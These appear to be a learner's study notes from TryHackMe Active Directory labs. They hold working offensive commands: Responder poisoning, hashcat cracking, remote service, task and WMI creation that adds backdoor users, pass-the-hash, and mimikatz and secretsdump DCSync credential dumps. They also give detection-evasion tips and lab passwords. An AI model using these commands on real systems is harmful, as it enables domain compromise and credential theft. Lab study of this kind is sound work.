# Active Directory

## Questions to ask later. 

- What's the deffirence between OU and Security Groups? 
- The process of granting privileges to a user over some OU or other AD Object is called... DELEGATION
- What is the name of the network share used to distribute GPOs to domain machines? SYSVOL
- What parameter option of the runas binary will ensure that the injected credentials are used for all network connections?
- What native Windows binary allows us to inject credentials legitimately into memory?
- 


## Authentication relay. 

- It's important to understand the authentication that happens duging the use of SMB. 
- Responder is used to intercept the NetNTLM challenge that happens when using some of SMB devices (printers) to crack it. 
- It tricks cleint to talk to your rogue device instead of the server responsible for the NTLM authentication. 
- Reponder try to poison Link-Local Multicast NAme Resolution (LLMNR), NetBIOS Name Service, and Web proxy auro-discovery. 
- LLMNR is like DNS. it works when DNS Fails to do its job. 
- NBT-NS maps NetBIOS names to IP addresses and relies on broadcast messages for discovery. 
- "Web Proxy Auto-Discovery," is used in many web browsers and operating systems to automatically discover and configure web proxy settings for client devices on a network
- IMPORTANT: it is crucial to understand that this behaviour can be disruptive and thus detected. By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to. Do keep this in mind when using Responder on a security assessment.
- SMB Signing should be disabled or not enforced
- you crack captured hash with hascat: `hashcat -m 5600 toCrack.txt /root/Rooms/BreachingAD/task5/passwordlist.txt --force`

## Enumerating AD. 

Creds:  Your credentials have been generated: Username: `jasmine.stanley Password: G0O6Zd5aM` 
- connect to ssh `ssh za.tryhackme.com\\jasmine.stanley@thmjmp1.za.tryhackme.com`
- `runas.exe` in windows. Have you ever found AD credentials but nowhere to log in with them? Runas may be the answer you've been looking for!
- Syntax: `runas.exe /netonly /user:<domain>\<username> cmd.exe` 
- TRICK: In security assessments, you will often have network access and have just discovered AD credentials but have no means or privileges to create a new domain-joined machine. So we need the ability to use those credentials on a Windows machine we control.
- `netonly`: we want to load creds for network authentication and not against DC, local commands are executed with your standard user. 
- `/user` we proivde the creds obtained. 
- `cmd.exe` the command we want to use as the user we obtained later. 
- It's also important to make sure that the creds are working properly. One way to do it is to list the SYSVOL. 
- We need to configure DNS before we test creds. (Sometimes there's no need to if there's DHCP)
- Using the IP of the DC we can execute this script:  
```powershell
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
 ```
 - Question: Is there a difference between dir \\za.tryhackme.com\SYSVOL and dir \\<DC IP>\SYSVOL and why the big fuss about DNS?
 - There is quite a difference, and it boils down to the authentication method being used. When we provide the hostname, network authentication will attempt first to perform Kerberos authentication. Since Kerberos authentication uses hostnames embedded in the tickets, if we provide the IP instead, we can force the authentication type to be NTLM. While on the surface, this does not matter to us right now, it is good to understand these slight differences since they can allow you to remain more stealthy during a Red team assessment. In some instances, organisations will be monitoring for OverPass- and Pass-The-Hash Attacks. Forcing NTLM authentication is a good trick to have in the book to avoid detection in these cases.
- To run WinRM you need group membership of Remote Managamenet Users. 
- We can create services remotely using sc: Ports: 135/TCP 445/TCP 139/TCP (borth RPC over SMB). It requires Group Memberships. 
- Clue: If we configure a Windows service to run any application, it will still execute it and fail afterwards.
- Syntax: `sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto` and `sc.exe \\TARGET start THMservice`.
- To create a scheduled task remotely we can use `schtasks`
- Syntax: `schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 ` `schtasks /s TARGET /run /TN "THMtask1"`
- WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.
- To establish WMI session from powershell we can use: 
```powershell 
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
- `New-Cimsession` is used to configure WMI session. 
- Remote proccess Creation using WMI: Ports: 135/5986. Administartor previlidge required.  
```powershell
	$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

	Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```
- There's no output here but the process will be created silently. 
- Creating services remotely with WMI. Ports: 135/5985. Administartor previlidge required

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```
- We can start the service using: 

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

- Creating scheduled Tasks Remotely with WMI: Ports: 135/5985 WinRM HTTP Administartor previlidge required
- We can create and execute scheduled tasks by using some cmdlets availabel in Windows default installation. 

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```
- Installing MSI packages through WMI. Ports: 135/5985 Administartor previlidge required
- The goal is to installl a msi package remotely after somehow copying to the target system. (To research: How to copy msi package to target system silently)

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
- Note: When using local account to connect to a server, the authentication process doesn't go through the DC. It only does when using domain account. 
- Using alternative authentication
- Pass-the-hash: If we managed to get the hash by extracting it from a target, we can authenticate with it if the DC is configured to use NTLM authentication (how to know if the DC is configured to use NTLM hash)
```cmd
mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```
- You can use xfreerdp pr psexec.py to execute commands with the obtained hashes. 
- `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`
- `psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`
- Kerberos Authentication: 
 	1 users sends his username + encrypted timestamp + part of the password to the KDC. 
 	2 KDC create TGT + Session Key. 
 	3 TGT is encyrpted using the krbtgt account's password hash. 
 	4 Users can use TGT to request TGS. 
 	 - user sends username + timestamp encrypted + Session key + TGT + SPN. SPN indicates the servcices and and server we tend to access. 
 	5 KDC sends TGS + Service Session Key to authenticate to the service. TGS is encrypted using the Services Owner Hash. 
 	- The Service Owner is the user or machine account under which the service runs. The TGS contains a copty of the Service Session Key encrypted so the onwer can access it by decerypting the TGS
 	- The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key
- Extracting TGTs require admin privs but to extract TGS we only need low-privileged account. 
- Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the klist command:
- Overpass-the-hash / pass-the-key
- When asking for TGT, timestamp is encrypted with key derived from the password using algo: AC4, AES128 or AES256. If we have that key we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-The-Key. 
- If RC4 is used the NTLM hash can be used as the key to request TGT: Overpass-the-Hash. 
- We can also abuse Shares with executables or scripts. 


## Exploiting AD 

### Permission delegation 
- Permission delegeation is when admins grant users to specific permission to do some task. It's often referred to as ACL-based attacks. Access Control Enteries (ACEs)
- You can always refer to BloodHound docs for enumeration ACEs explaination: https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#


## Persistence

- Username: Administrator

Password: tryhackmewouldnotguess1@

Domain: ZA

### DC Sync 

- Using one DC is inssuficient, how ot authenticate to other DCs? Each DC runs a process called the Knowledge Consistency Checker (KCC). 
- The KCC generates a topology for the AD forest and automatically connects to other DC through RPC to synchronise inforamtion. 
- This includes updates user's new password, new objects. That's why you usually have to wait a couple of minutes before you authenticate because the DC where the password change occured could perhapsnot be the same one as the wone where you are authenticating to. 
- If we have access to an account that has domain replication permissions, we can stage a DC Synac attack to harvest credentials from a DC. 
- while we should always dump privileged credentials such as those that are memeber so f the domain Admins gorup, Such creds will be rotated. 
- The goal is to persist with near-privileged credentials. 
 * Credentials that have local administrator rights on several machines. 
 * Services accounts that have delegation permissions. 
 * Accounts used for privileged AD services. 
- to perform DC Synac attack with mimikatz: `mimikatz # log <username>_dcdump.txt` & `mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all`
- You can use secretsdump to do it remotely: `secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes`
	
